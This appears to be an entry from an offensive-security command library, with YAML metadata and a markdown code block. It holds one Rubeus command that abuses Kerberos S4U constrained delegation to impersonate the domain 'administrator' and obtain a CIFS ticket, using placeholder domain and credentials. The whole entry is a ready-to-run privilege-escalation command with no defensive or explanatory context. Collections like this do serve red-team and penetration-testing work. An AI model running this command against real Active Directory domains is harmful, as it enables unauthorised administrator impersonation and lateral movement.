---
id: 5faa5b1a-bf0f-47f9-ab15-1db0aacf4ef9
name: S4U delegation with password
type: command
executor: bash
data: Rubeus.exe s4u /nowrap /msdsspn:"time/target.local" /altservice:cifs /impersonateuser:"administrator"
  /domain:"domain" /user:"user" /password:"password"
output: null
created_at: '2023-04-06T03:56:07.695360+00:00'
updated_at: '2023-04-10T20:26:26.278263+00:00'
---

# S4U delegation with password

```bash
Rubeus.exe s4u /nowrap /msdsspn:"time/target.local" /altservice:cifs /impersonateuser:"administrator" /domain:"domain" /user:"user" /password:"password"
```
